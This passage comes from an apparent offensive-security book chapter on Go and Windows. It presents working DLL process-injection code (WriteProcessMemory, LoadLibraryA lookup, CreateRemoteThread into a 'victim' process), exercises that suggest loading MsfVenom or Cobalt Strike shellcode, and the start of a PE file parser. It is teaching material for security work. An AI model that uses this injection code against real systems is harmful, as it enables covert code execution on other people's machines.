receiving Windows function.  
Writing to Memory with the WriteProcessMemory Windows API
Next, we’ll use the WriteProcessMemory() function to write to the remote pro-
cess’s memory region previously initialized using the VirtualAllocEx() func-
tion. In Listing 12-9, we’ll keep things simple by calling a DLL by file path, 
rather than writing the entire DLL code into memory. 
func WriteProcessMemory(i *Inject) error {
    var nBytesWritten *byte
    dllPathBytes, err := syscall.BytePtrFromString(i.DllPath) u
    if err != nil {
        return err
    }
    writeMem, _, lastErr := ProcWriteProcessMemory.Call(
        i.RemoteProcHandle, // HANDLE  hProcess
        i.Lpaddr, // LPVOID  lpBaseAddress
        uintptr(unsafe.Pointer(dllPathBytes)), // LPCVOID lpBuffer v
        uintptr(i.DLLSize), // SIZE_T  nSize
        uintptr(unsafe.Pointer(nBytesWritten))) // SIZE_T  *lpNumberOfBytesWritten
    if writeMem == 0 {
        return errors.Wrap(lastErr, "[!] ERROR : Can't write to process memory.")
    }
    return nil
}
Listing 12-9: Writing the DLL file path to remote process memory (/ch-12 /procInjector/winsys/inject.go)
The first noticeable syscall function is BytePtrFromString() u, which is a 
convenience function that consumes a string and returns the base index-0 
pointer location of a byte slice, which we’ll assign to dllPathBytes. 
Finally, we get to see unsafe.Pointer in action. The third argument to the 
ProcWriteProcessMemory.Call is defined within the Windows API specification 
前沿信安资讯阵地  公众号：i nf osrc
Windows System Interaction and Analysis   275
as “lpBuffer—a pointer to the buffer that contains data to be written in the 
address space of the specified process.” In order to pass the Go pointer 
value defined in dllPathBytes over to the receiving Windows function, we use 
unsafe.Pointer to circumvent type conversions. One final point to make here 
is that uintptr and unsafe.Pointer v are acceptably safe, since both are being 
used inline and without the intent of assigning the return value to a vari-
able for later reuse.
Finding LoadLibraryA with the GetProcessAddress Windows API
Kernel32.dll exports a function called LoadLibraryA(), which is available on 
all Windows versions. Microsoft documentation states that LoadLibraryA() 
“loads the specified module into the address space of the calling process. 
The specified module may cause other modules to be loaded.” We need 
to obtain the memory location of LoadLibraryA() before creating a remote 
thread necessary to execute our actual process injection. We can do this 
with the GetLoadLibAddress() function—one of those supporting functions 
mentioned earlier (Listing 12-10).
func GetLoadLibAddress(i *Inject) error {
    var llibBytePtr *byte
    llibBytePtr, err := syscall.BytePtrFromString("LoadLibraryA") u
    if err != nil {
        return err
    }
    lladdr, _, lastErr := ProcGetProcAddress.Callv(
        ModKernel32.Handle(), // HMODULE hModule w
        uintptr(unsafe.Pointer(llibBytePtr))) // LPCSTR lpProcName x
    if &lladdr == nil {
        return errors.Wrap(lastErr, "[!] ERROR : Can't get process address.")
    }
    i.LoadLibAddr = lladdr
    fmt.Printf("[+] Kernel32.Dll memory address: %v\n", unsafe.Pointer(ModKernel32.Handle()))
    fmt.Printf("[+] Loader memory address: %v\n", unsafe.Pointer(i.LoadLibAddr))
    return nil
}
Listing 12-10: Obtaining the LoadLibraryA() memory address by using the GetProcessAddress() Windows 
function (/ch-12/procInjector/winsys/inject.go)
We use the GetProcessAddress() Windows function to identify the base 
memory address of LoadLibraryA() necessary to call the CreateRemoteThread() 
function. The ProcGetProcAddress.Call() v function takes two arguments: the 
first is a handle to Kernel32.dll w that contains the exported function we’re 
interested in (LoadLibraryA()), and the second is the base index-0 pointer loca-
tion x of a byte slice returned from the literal string "LoadLibraryA" u.
Executing the Malicious DLL Using the CreateRemoteThread Windows API
We’ll use the CreateRemoteThread() Windows function to create a thread 
against the remote process’ virtual memory region. If that region happens 
前沿信安资讯阵地  公众号：i nf osrc
276   Chapter 12
to be LoadLibraryA(), we now have a means to load and execute the region 
of memory containing the file path to our malicious DLL. Let’s review the 
code in Listing 12-11.
func CreateRemoteThread(i *Inject) error {
    var threadId uint32 = 0
    var dwCreationFlags uint32 = 0
    remoteThread, _, lastErr := ProcCreateRemoteThread.Callu(
        i.RemoteProcHandle, // HANDLE hProcess v
        uintptr(nullRef), // LPSECURITY_ATTRIBUTES lpThreadAttributes
        uintptr(nullRef), // SIZE_T dwStackSize
        i.LoadLibAddr, // LPTHREAD_START_ROUTINE lpStartAddress w
        i.Lpaddr, // LPVOID lpParameter x
        uintptr(dwCreationFlags), // DWORD dwCreationFlags
        uintptr(unsafe.Pointer(&threadId)), // LPDWORD lpThreadId
    )
    if remoteThread == 0 {
        return errors.Wrap(lastErr, "[!] ERROR : Can't Create Remote Thread.")
    }
    i.RThread = remoteThread
    fmt.Printf("[+] Thread identifier created: %v\n", unsafe.Pointer(&threadId))
    fmt.Printf("[+] Thread handle created: %v\n", unsafe.Pointer(i.RThread))
    return nil
}
Listing 12-11: Executing the process injection by using the CreateRemoteThread() Windows function (/ch-12 
/procInjector/winsys/inject.go)
The ProcCreateRemoteThread.Call() u function takes a total of seven 
arguments, although we’ll use only three of them in this example. The 
relevant arguments are RemoteProcHandle v containing the victim process’s 
handle, LoadLibAddr w containing the start routine to be called by the thread 
(in this case, LoadLibraryA()), and, lastly, the pointer x to the virtually 
allocated memory holding the payload location.
Verifying Injection with the WaitforSingleObject Windows API
We’ll use the WaitforSingleObject() Windows function to identify when a 
particular object is in a signaled state. This is relevant to process injection 
because we want to wait for our thread to execute in order to avoid bailing 
out prematurely. Let’s briefly discuss the function definition in Listing 12-12. 
func WaitForSingleObject(i *Inject) error {
    var dwMilliseconds uint32 = INFINITE
    var dwExitCode uint32
    rWaitValue, _, lastErr := ProcWaitForSingleObject.Call( u
        i.RThread, // HANDLE hHandle
        uintptr(dwMilliseconds)) // DWORD  dwMilliseconds
    if rWaitValue != 0 {
        return errors.Wrap(lastErr, "[!] ERROR : Error returning thread wait state.")
    }
    success, _, lastErr := ProcGetExitCodeThread.Call( v
前沿信安资讯阵地  公众号：i nf osrc
Windows System Interaction and Analysis   277
        i.RThread, // HANDLE  hThread
        uintptr(unsafe.Pointer(&dwExitCode))) // LPDWORD lpExitCode
    if success == 0 {
        return errors.Wrap(lastErr, "[!] ERROR : Error returning thread exit code.")
    }
    closed, _, lastErr := ProcCloseHandle.Call(i.RThread) // HANDLE hObject w
    if closed == 0 {
        return errors.Wrap(lastErr, "[!] ERROR : Error closing thread handle.")
    }
    return nil
} 
Listing 12-12: Using the WaitforSingleObject() Windows function to ensure successful thread execution  
(/ch-12/procInjector/winsys/inject.go)
Three notable events are occurring in this code block. First, the 
ProcWaitForSingleObject.Call() system call u is passed the thread handle 
returned in Listing 12-11. A wait value of INFINITE is passed as the second 
argument to declare an infinite expiration time associated with the event. 
Next, ProcGetExitCodeThread.Call() v determines whether the thread 
terminated successfully. If it did, the LoadLibraryA function should have 
been called, and our DLL will have been executed. Finally, as we do for 
the responsible cleanup of almost any handle, we passed the ProcCloseHandle 
.Call() system call w so that that thread object handle closes cleanly.
Cleaning Up with the VirtualFreeEx Windows API
We use the VirtualFreeEx() Windows function to release, or decommit, the 
virtual memory that we allocated in Listing 12-8 via VirtualAllocEx(). This is 
necessary to clean up memory responsibly, since initialized memory regions 
can be rather large, considering the overall size of the code being injected 
into the remote process, such as an entire DLL. Let’s take a look at this 
block of code (Listing 12-13).
func VirtualFreeEx(i *Inject) error {
    var dwFreeType uint32 = MEM_RELEASE
    var size uint32 = 0 //Size must be 0 to MEM_RELEASE all of the region
    rFreeValue, _, lastErr := ProcVirtualFreeEx.Callu(
        i.RemoteProcHandle, // HANDLE hProcess v
        i.Lpaddr, // LPVOID lpAddress w
        uintptr(size), // SIZE_T dwSize x
        uintptr(dwFreeType)) // DWORD dwFreeType y
    if rFreeValue == 0 {
        return errors.Wrap(lastErr, "[!] ERROR : Error freeing process memory.")
    }
    fmt.Println("[+] Success: Freed memory region")
    return nil
}
Listing 12-13: Freeing virtual memory by using the VirtualFreeEx() Windows function (/ch-12/procInjector 
/winsys/inject.go)
前沿信安资讯阵地  公众号：i nf osrc
278   Chapter 12
The ProcVirtualFreeEx.Call() function u takes four arguments. The 
first is the remote process handle v associated with the process that is to 
have its memory freed. The next argument is a pointer w to the location 
of memory to be freed. 
Notice that a variable named size x is assigned a 0 value. This is nec-
essary, as defined within the Windows API specification, to release the 
entire region of memory back into a reclaimable state. Finally, we pass the 
MEM_RELEASE operation y to completely free the process memory (and our 
discussion on process injection).
Additional Exercises
Like many of the other chapters in this book, this chapter will provide the 
most value if you code and experiment along the way. Therefore, we con-
clude this section with a few challenges or possibilities to expand upon the 
ideas already covered:
•
One of the most important aspects of creating code injection is main-
taining a usable tool chain sufficient for inspecting and debugging 
process execution. Download and install both the Process Hacker and 
Process Monitor tools. Then, using Process Hacker, locate the memory 
addresses of both Kernel32 and LoadLibrary. While you’re at it, locate the 
process handle and take a look at the integrity level, along with inher-
ent privileges. Now inject your code into the same victim process and 
locate the thread. 
•
You can expand the process injection example to be less trivial. For 
example, instead of loading the payload from a disk file path, use 
MsfVenom or Cobalt Strike to generate shellcode and load it directly 
into process memory. This will require you to modify VirtualAllocEx 
and LoadLibrary.
•
Create a DLL and load the entire contents into memory. This is simi-
lar to the previous exercise: the exception is that you’ll be loading an 
entire DLL rather than shellcode. Use Process Monitor to set a path 
filter, process filter, or both, and observe the system DLL load order. 
What prevents DLL load order hijacking?
•
You can use a project called Frida (https://www.frida.re/) to inject the 
Google Chrome V8 JavaScript engine into the victim process. It has a 
strong following with mobile security practitioners as well as develop-
ers: you can use it to perform runtime analysis, in-process debugging, 
and instrumentation. You can also use Frida with other operating sys-
tems, such as Windows. Create your own Go code, inject Frida into a 
victim process, and use Frida to run JavaScript within the same process. 
Becoming familiar with the way Frida works will require some research, 
but we promise it’s well worth it.  
Windows System Interaction and Analysis   279
The Portable Executable File
Sometimes we need a vehicle to deliver our malicious code. This could be a 
newly minted executable (delivered through an exploit in preexisting code), 
or a modified executable that already exists on the system, for example. If 
we wanted to modify an existing executable, we would need to understand 
the structure of the Windows Portable Executable (PE) file binary data format, 
as it dictates how to construct an executable, along with the executable’s  
capabilities. In this section, we’ll cover both the PE data structure and Go’s 
PE package, and build a PE binary parser, which you can use to navigate 
the structure of a PE binary. 
Understanding the PE File Format 
First, let’s discuss the PE data structure format. The Windows PE file format 
is a data structure most often represented as an executable, object code, 
or a DLL. The PE format also maintains references for all resources used 
during the initial operating system loading of the PE binary, including the 
export address table (EAT) used to maintain exported functions by ordinal,  
the export name table used to maintain exported functions by name, the 
import address table (IAT), import name table, thread local storage, and 
resource management, among other structures. You can find the PE for-
mat specification at https://docs.microsoft.com/en-us/windows/win32/debug 
/pe-format/. Figure 12-6 shows the PE data structure: a visual representation 
of a Windows binary. 
COFF file header 
Section table  
DOS stub
DOS header
Signature 0x5a4d 
PE header PTR 0x3c 
Standard fields 
Data directories  
Windows-spec fields  
Optional header 32-bit 
Optional header 64-bit 
Figure 12-6: The Windows PE file format 
We will examine each of these top-down sections as we build out the 
PE parser.
280   Chapter 12
Writing a PE Parser 
Throughout the following sections, we will write the individual parser 
components necessary to analyze each PE section within the Windows 
binary executable. As an example, we’ll use the PE format associated with 
the Telegram messaging application binary located at https://telegram.org, 
since this app is both less trivial than the often overused putty SSH binary 
example, and is distributed as a PE format. You can use almost any Windows 
binary executable, and we encourage you to investigate others. 
Loading the PE binary and File I/O
In Listing 12-14, we’ll start by using the Go PE package to prepare the 
Telegram binary for further parsing. You can place all the code that we 
create when writing this parser in a single file within a main() function.
import (
    u "debug/pe"
    "encoding/binary"
    "fmt"
    "io"
    "log"
    "os"
)
func main() {
    v f, err := os.Open("Telegram.exe")
    check(err)
    w pefile, err := pe.NewFile(f)
    check(err)
    defer f.Close()
    defer pefile.Close()
Listing 12-14: File I/O for PE binary (/ch-12/peParser /main.go)
Prior to reviewing each of the PE structure components, we need to 
stub out the initial import u and file I/O by using the Go PE package. We 
use os.Open() v and then pe.NewFile() w to create a file handle and a PE file 
object, respectively. This is necessary because we intend to parse the PE file 
contents by using a Reader object, such as a file or binary reader. 
Parsing the DOS Header and the DOS Stub
The first section of the top-down PE data structure illustrated in Figure 12-6 
starts with a DOS header. The following unique value is always present within 
any Windows DOS-based executable binary:  0x4D 0x5A (or MZ in ASCII), which 
aptly declares the file as a Windows executable. Another value universally 
present on all PE files is located at offset 0x3C. The value at this offset points 
to another offset containing the signature of a PE file: aptly, 0x50 0x45 0x00 
0x00 (or PE in ASCII). 
Windows System Interaction and Analysis   281
The header that immediately follows is the DOS Stub, which always pro-
vides the hex values for This program cannot be run in DOS mode; the exception  
to this occurs when a compiler’s /STUB linker option provides an arbitrary string 
value. If you take your favorite hex editor and open the Telegram application, 
it should be similar to Figure 12-7. All of these values are present.
Figure 12-7: A typical PE binary format file header
So far, we have described the DOS Header and Stub while also looking at 
the hexadecimal representation through a hex editor. Now, let’s take a look at 
parsing those same values with Go code, as provided in Listing 12-15.
    dosHeader := make([]byte, 96)
    sizeOffset := make([]byte, 4)
    // Dec to Ascii (searching for MZ)
    _, err = f.Read(dosHeader) u
    check(err)
    fmt.Println("[-----DOS Header / Stub-----]")
    fmt.Printf("[+] Magic Value: %s%s\n", string(dosHeader[0]), string(dosHeader[1])) v
    // Validate PE+0+0 (Valid PE format)
    pe_sig_offset := int64(binary.LittleEndian.Uint32(dosHeader[0x3c:])) w
    f.ReadAt(sizeOffset[:], pe_sig_offset) x
    fmt.Println("[-----Signature Header-----]")
    fmt.Printf("[+] LFANEW Value: %s\n", string(sizeOffset))
/* OUTPUT
[-----DOS Header / Stub-----]
[+] Magic Value: MZ
[-----Signature Header-----]
[+] LFANEW Value: PE
*/
Listing 12-15: Parsing the DOS Header and Stub values (/ch-12/peParser /main.go)
282   Chapter 12